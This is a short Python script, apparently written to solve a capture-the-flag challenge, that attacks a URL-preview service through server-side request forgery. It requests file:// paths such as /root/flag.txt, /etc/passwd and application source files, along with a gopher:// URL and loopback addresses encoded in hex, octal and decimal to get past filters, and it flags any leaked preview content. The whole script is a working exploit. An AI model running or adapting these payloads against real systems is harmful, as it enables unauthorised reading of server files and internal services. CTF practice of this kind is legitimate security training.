import urllib.request
import urllib.parse

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req)
        return res.read().decode()
    except urllib.error.HTTPError as e:
        return f'HTTP Error: {e.code} - {e.read().decode()[:200]}'
    except Exception as e:
        return f'Exception: {e}'

urls = [
    'file:///root/flag.txt',
    'file:///etc/passwd',
    'file:///app/server.js',
    'file:///var/www/html/index.php',
    'file:///app/app.py',
    'http://127.0.0.1',
    'http://localhost',
    'gopher://127.0.0.1:80/_',
    'http://[::1]',
    'http://0x7f000001',
    'http://0177.0.0.1',
    'http://2130706433',
]

for u in urls:
    print(f'=== {u} ===')
    result = fetch(u)
    if 'preview-content' in result:
        # Extract preview content
        start = result.find('preview-content')
        snippet = result[start:start+500]
        print(f'  PREVIEW FOUND: {snippet}')
    elif 'error-msg' in result:
        print('  App error (gagal mengambil konten)')
    elif 'HTTP Error' in result:
        print(f'  {result[:200]}')
    else:
        print(f'  Other response, length={len(result)}')
